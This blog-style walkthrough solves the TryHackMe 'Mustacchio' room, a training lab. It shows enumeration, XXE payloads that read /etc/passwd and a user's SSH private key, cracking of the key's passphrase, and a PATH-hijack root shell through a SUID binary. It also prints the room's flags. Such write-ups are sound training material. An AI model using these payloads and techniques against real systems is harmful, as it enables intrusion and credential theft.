---
title: "Walk-through of Mustacchio from TryHackMe"
header:
  teaser: /assets/images/2021-06-13-17-10-56.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Linux
  - XXE
  - JohnTheRipper
---

## Machine Information

![mustacchio](/assets/images/2021-06-13-17-10-56.png)

Mustacchio is an easy difficulty room on TryHackMe. Our initial scan reveals SSH on port 22 which is left for later, and our investigation starts with Apache on port 80 and nginx on port 8765. We find a basic website with no real content hosted by Apache, and a login page to some sort of admin area hosted by nginx. Gobuster finds hidden folders on both sites, and we progress by finding a comment in one of the files found in there. After gaining access to the admin panel we find it is susceptible to an xxe exploit. We use this to get a user rsa key, and then access the server via SSH. From there we find a badly written binary that's susceptible to an unquoted path attack allowing us to gain a root shell.

<!--more-->

Skills required are basic file and operating system enumeration and exploration knowledge. Skills gained are experience in using an external entity attack (XXE) and methods to gain roots shells using unquoted service paths.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Mustacchio](https://tryhackme.com/room/mustacchio) |
| Machine Release Date | 29th March 2021 |
| Date I Completed It | 13th June 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.206.78 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/thm/mustacchio]
└─# nmap -p$ports -sC -sV -oA mustacchio 10.10.206.78
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 16:51 BST
Nmap scan report for 10.10.206.78
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
```

We find a few open ports. Let's add the servers IP to our hosts file before we begin:

```text
┌──(root💀kali)-[~/thm/internal]
└─# echo 10.10.206.78 mustacchio.thm >> /etc/hosts
```

First we'll have a look on port 80 to see what the website has for us:

![mustacchio-port-80](/assets/images/2021-06-12-16-58-34.png)

Turns out there's very little here. Let's look at the other site on port 8765:

![mustacchio-admin](/assets/images/2021-06-12-16-59-56.png)

We find a login page, but for now we haven't got any credentials. With nothing obvious on either let's try Gobuster:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://mustacchio.thm   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/12 17:00:00 Starting gobuster in directory enumeration mode
===============================================================
http://mustacchio.thm/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
http://mustacchio.thm/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
http://mustacchio.thm/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/] 
http://mustacchio.thm/server-status        (Status: 403) [Size: 279]                                    
===============================================================
2021/06/12 17:13:18 Finished
===============================================================
```

Gobuster finds a few of the expected folders, but also one called custom. Let's have a look at that:

![mustacchio-custom](/assets/images/2021-06-12-17-04-12.png)

Two folders, and in the js one we find a file called mobile.js:

![mustacchio-mobile](/assets/images/2021-06-12-17-11-26.png)

At the bottom we see a comment out line with what is probably a hash. Let's check it:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# hash-identifier bcf063452ff1193524e499349d0ac459 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Possibly an MD5 hash, try and crack it on one of the many websites out there:

![mustacchio-md5](/assets/images/2021-06-12-17-17-52.png)

That was nice and easy! 

Going back to the adminpanel login page and using this password with the user admin let's us log in and we find a single page:

![mustacchio-adminpanel](/assets/images/2021-06-12-17-20-33.png)

Typing something in and clicking submit doesn't appear to do anything, but looking at the source of the page gives us a clue:

```text
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mustacchio | Admin Page</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/home.css">
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
<SNIP>
```

What is this example? Maybe it's a clue, let's try Gobuster on this port as well:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://mustacchio.thm:8765
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm:8765
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/12 17:02:01 Starting gobuster in directory enumeration mode
===============================================================
http://mustacchio.thm:8765/assets               (Status: 301) [Size: 194] [--> http://mustacchio.thm:8765/assets/]
http://mustacchio.thm:8765/auth                 (Status: 301) [Size: 194] [--> http://mustacchio.thm:8765/auth/]  
===============================================================
2021/06/12 17:14:50 Finished
===============================================================
```

We do indeed find auth is a hidden subfolder. Using curl we find we can get the file mentioned before:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# curl http://mustacchio.thm:8765/auth/dontforget.bak
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 
```

The file contents is not interesting, but the structure of it is. We can use this knowledge of it to craft an exploit using an External Enitity (XXE) attack. I found [this](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) which explains in detail how it works. I can take their example:

```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

And use the structure from above to create my own attack:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

This works and I can see the contents of the passwd file:

![mustacchio-xxe](/assets/images/2021-06-12-17-41-33.png)

From that we can see two users:

```text
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

Looking back at the adminpanel page source we see there is another comment at the bottom:

```text
    <!-- Barry, you can now SSH in using your key!-->
```

Know that we can now display the contents of files on the server, it's safe to assume this is our intended path. Assuming the SSH key is in the default location for Barry let's try to grab it:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

We do indeed get the rsa key:

![mustacchio-rsa_key](/assets/images/2021-06-12-17-42-12.png)

Copy and paste that in to a file on Kali:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
<SNIP>
-----END RSA PRIVATE KEY-----
```

We can see it's encrypted, so we'll need to try and crack it to get a password:

```text
──(root💀kali)-[~/thm/mustacchio]
└─# locate ssh2john
/usr/share/john/ssh2john.py

┌──(root💀kali)-[~/thm/mustacchio]
└─# /usr/share/john/ssh2john.py id_rsa > id_rsa.john

┌──(root💀kali)-[~/thm/mustacchio]
└─# john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
1g 0:00:00:05 DONE (2021-06-12 17:43) 0.1697g/s 2434Kp/s 2434Kc/s 2434KC/s xCvBnM,..*7¡Vamos!
Session completed
```

If you forget to change the permission on the id_rsa file you'll get this error if you use it to log in via SSH:

```text
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
barry@mustacchio.thm: Permission denied (publickey).
```

Change that then try again, using the password we've just cracked:

```text
┌──(root💀kali)-[~/thm/mustacchio]
└─# chmod 600 id_rsa

┌──(root💀kali)-[~/thm/mustacchio]
└─# ssh -i id_rsa barry@mustacchio.thm
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable
New release '18.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.
barry@mustacchio:~$
```

Get the user flag while we're here:

```text
barry@mustacchio:~$ ls -l
-rw-r--r-- 1 barry barry 33 Jun 12 15:48 user.txt
barry@mustacchio:~$ cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```

I#m doing usual checks I go through when I first get access to a target, when I got to SUID binaries I find this:

```text
barry@mustacchio:/home/joe$ find / -perm -4000 2>/dev/null
<SNIP>
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

Looking at live_log we see it is an executable that I have permissions for:

```text
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

We could download it to Kali and have a deeper look inside it, but first check for strings and awk on the target. If they're there then simple to first have a look in place:

```text
barry@mustacchio:/home/joe$ which strings
/usr/bin/strings
barry@mustacchio:/home/joe$ which awk
/usr/bin/awk
```

Depending on the size of the binary the output from strings can be large and hard to look through. So I usually cut down the output with awk and just see lines with 20 characters or more first. If there's nothing interesting I'll go down to 15, so more to look through incase I'd excluded it:

```text
barry@mustacchio:/home/joe$ strings live_log | awk 'length($0) > 20'
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
__do_global_dtors_aux
__do_global_dtors_aux_fini_array_entry
__frame_dummy_init_array_entry
_GLOBAL_OFFSET_TABLE_
_ITM_deregisterTMCloneTable
__libc_start_main@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
```

This time I found it on the first go. We can see there is a call to tail which doesn't include the full path to the binary. We can exploit this unquoted path to execute a file of our choice. [This](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) article is quite detailed if you want to better understand it this type of attack.

First move to another folder, then add it to the PATH of the system:

```text
barry@mustacchio:/home/joe$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/home/joe$ cd /dev/shm
barry@mustacchio:/dev/shm$ export PATH=/dev/shm:$PATH
barry@mustacchio:/dev/shm# echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now we can create a file in this folder called tail, and when the live_log binary is executed it will call our file instead of the correct version of tail:

```text
barry@mustacchio:/dev/shm# echo "/bin/bash -p" > tail
barry@mustacchio:/dev/shm# chmod +x
```

Finally we can run the live_log binary to switch us to root:

```text
barry@mustacchio:/dev/shm$ /home/joe/live_log
root@mustacchio:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

Let's get the root flag:

```text
root@mustacchio:/dev/shm# cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5
```

And we are all done. That was a nice simple room, I hope you enjoyed it and learned something useful along the way.

See you next time.
